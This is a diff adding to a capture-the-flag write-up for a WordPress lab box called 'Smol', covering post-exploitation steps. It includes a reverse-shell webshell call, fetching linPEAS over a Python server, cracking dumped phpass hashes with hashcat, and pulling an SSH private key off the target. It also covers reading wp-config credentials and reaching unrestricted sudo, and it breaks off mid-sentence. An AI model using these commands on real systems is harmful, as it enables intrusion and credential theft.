@@ -152,4 +152,155 @@ http://smol.thm/wp-admin/pages.php?cmd=php /tmp/rev.php
 We're in!
 
 Now let's make our shell a little bit prettier by running:
-- 
+```bash
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+```
+Then let's do the folliwng to get access to `clear`:
+```bash
+export TERM=xterm
+```
+and lastly, let's run this to get arrow keys and ctrl+c:
+press ctrl+z
+```bash
+stty raw -echo; fg
+```
+
+Now that we have a somewhat stable shell, let's find that first flag!
+This should be in a home folder, but our `www-data` user doesn't have permission to access any. This means that we need to find a way to escalate our privileges to at least to another user.
+
+For this, we are gonna use a tool called [linPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS) to point us in the right direction.
+
+Since outbound connections don't seem to be allowed, let's first download the script on **our own** machine and then wget it with a python server. In other words on your attacking machine run:
+```bash
+wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh -o linpeas.sh
+python3 -m http.server 8000
+```
+Now on **the target machine** run:
+```bash
+wget http://[YOUR_IP]/linpeas.sh -o /tmp/linpeas.sh
+cd /tmp
+chmod +x linpeas.sh
+./linpeas.sh
+```
+
+Now we just have to get up (hard, I know), grab an espresso and wait for linpeas to finish analyzing.
+
+Out of all the findings of this script, one seems particularly interessante. There is a backup file in `/opt`, a directory that's usually empty.
+
+It's a database! Jackpot! let's crack it open and see what's inside:
+```bash
+nano wp_backup.sql
+```
+
+There is a particular entry inside this database that is going to give us what we want:
+```SQL
+--
+-- Dumping data for table `wp_users`
+--
+
+LOCK TABLES `wp_users` WRITE;
+/*!40000 ALTER TABLE `wp_users` DISABLE KEYS */;
+INSERT INTO `wp_users` VALUES (1,'admin','$P$Bvi8BHb84pjY/Kw0RWsOXUXsQ1aACL1','admin','admin@smol.thm','http://192.168.204.139','2023-08-16 06:58:30','',0,'admin'),(2,'wpuser','$P$BfZjtJpXL9gBwzNjLMTnTvBVh2Z1/E.','wp','wp@smol.thm','http://smol.thm','2023-08-16 11:04:07','',0,'wordpress user'),(3,'think','$P$B0jO/cdGOCZhlAJfPSqV2gVi2pb7Vd/','think','josemlwdf@smol.thm','http://smol.thm','2023-08-16 15:01:02','',0,'Jose Mario Llado Marti'),(4,'gege','$P$BsIY1w5krnhP3WvURMts0/M4FwiG0m1','gege','gege@smol.thm','http://smol.thm','2023-08-17 20:18:50','',0,'gege'),(5,'diego','$P$BWFBcbXdzGrsjnbc54Dr3Erff4JPwv1','diego','diego@smol.thm','http://smol.thm','2023-08-17 20:19:15','',0,'diego'),(6,'xavi','$P$BvcalhsCfVILp2SgttADny40mqJZCN/','xavi','xavi@smol.thm','http://smol.thm','2023-08-17 20:20:01','',0,'xavi');
+/*!40000 ALTER TABLE `wp_users` ENABLE KEYS */;
+UNLOCK TABLES;
+```
+
+**DAJE!** That's a lot of hashes, let's get cracking. Now the challenge does say that hashcat is slower on machines without a dedicated gpu. This is not the case for me, so I used that to crack the passwords by doing:
+
+```bash
+nano hashes.txt # and then pasted every hash in its own line
+hashcat -m 400 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt # This assumes you have rockyou.txt installed at that location
+```
+
+As you may have noticed, this is not your classic md5 hash. This is because wordpress uses the PHPass algorithm to store passwords, which is mode 400 in hashcat.
+
+Out of these hashes only the ones for `diego` and `gege` can be cracked. And even then, gege's password doesn't seem to work, but diego's does!
+
+Which means that by running:
+```bash
+su diego
+Enter your password: [password_we_just_cracked]
+```
+
+we can log in as diego, and get our first flag!
+```bash
+cd 
+cat user.txt
+```
+
+## Escalating our privileges - Second Flag
+Diego doesn't seem to be very privileged either, but he does seem to have more than `www-data`. For this reason let's run `linpeas.sh` again to see if there's anything new.
+
+```bash
+══╣ Possible private SSH keys were found!
+/home/think/.ssh/id_rsa
+```
+
+Bingo! An exposed ssh key we can download on our host machine. Let's get it by doing:
+```bash
+# On the target machine
+cd /home/think/.ssh/
+python3 -m http.server 8000
+
+# On our attacking machine
+wget http://smol.thm:8000/id_rsa
+ssh -i id_rsa think@smol.thm
+```
+
+If you did everything correctly you should now have access to the `think` user!
+
+I have to be honest with you, after this step I got a little stuck. And by a little I mean I started mashing some random commands, or some people say I started "enumerating" the machine.
+
+After some **enumeration** I discovered that think doesn't need a password for gege, which means we can just do
+```bash
+su gege
+```
+and we are now gege!
+
+Why gege you might ask? Gege has another backup file in its home folder, which we can now access... if we knew the password.
+
+But wait we do! We cracked gege's password when we compromised diego, and that's exactly what we needed.
+```bash
+unzip wordpress.old.zip
+Password: [Gege's cracked hash]
+```
+
+Guess what? In this past version, the user `xavi` has access over the database, which means we can do:
+```bash
+# From gege's home
+cd wordpress.old
+cat wp-config.php
+```
+
+And we will get:
+```php
+// ** Database settings - You can get this info from your web host ** //
+/** The name of the database for WordPress */
+define( 'DB_NAME', 'wordpress' );
+
+/** Database username */
+define( 'DB_USER', 'xavi' );
+
+/** Database password */
+define( 'DB_PASSWORD', '[REDACTED]' );
+```
+
+We can now use that password to access the `xavi` user
+```bash
+su xavi
+```
+
+Amici miei, we are at the end of the line. There's no more user to pwn, which means that now it's root's turn! A quick check on xavi's privileges will confirm that we just won:
+```bash
+xavi@smol:/home/gege/wordpress.old$ sudo -l
+[sudo] password for xavi: 
+Matching Defaults entries for xavi on smol:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User xavi may run the following commands on smol:
+    (ALL : ALL) ALL
+```
+**ALL** commands??!
+
+Yes amici, now we can just do
